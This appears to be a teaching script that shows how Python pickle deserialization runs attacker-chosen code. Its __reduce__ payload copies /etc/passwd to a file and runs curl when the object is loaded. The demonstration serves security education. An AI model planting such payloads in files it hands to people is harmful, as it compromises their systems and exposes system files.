# Not Secure!

# Pickling is not a secure way to deserialize data objects. DO NOT unpickle anything you did not pickle yourself.
# You have been WARNED!
#
# Here's how easy it is to create an exploit.
#
# I am going to pickle an object that is going to use the unix shell (admittedly this will not work on Windows,
# but it could with some more complicated code - plus I don't need this to run on every machine in the world,
# just as many as possible - at least that's the mindset if I were a hacker I guess)

import os
import pickle


class Exploit():
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt",))


def serialize_exploit(fname):
    with open(fname, 'wb') as f:
        pickle.dump(Exploit(), f)

# Now, I serialize this code to a file:

serialize_exploit('loadme')

# Now I send this file to some unsuspecting recipients and tell them they just need to load this up in their Python app.
# They deserialize the pickled object like so:

pickle.load(open('loadme', 'rb'))

# And now take a look at your folder that contains this notebook!

print('#' * 52 + '  ')
print('#' * 52 + '  ')
print('#' * 52 + '  ')
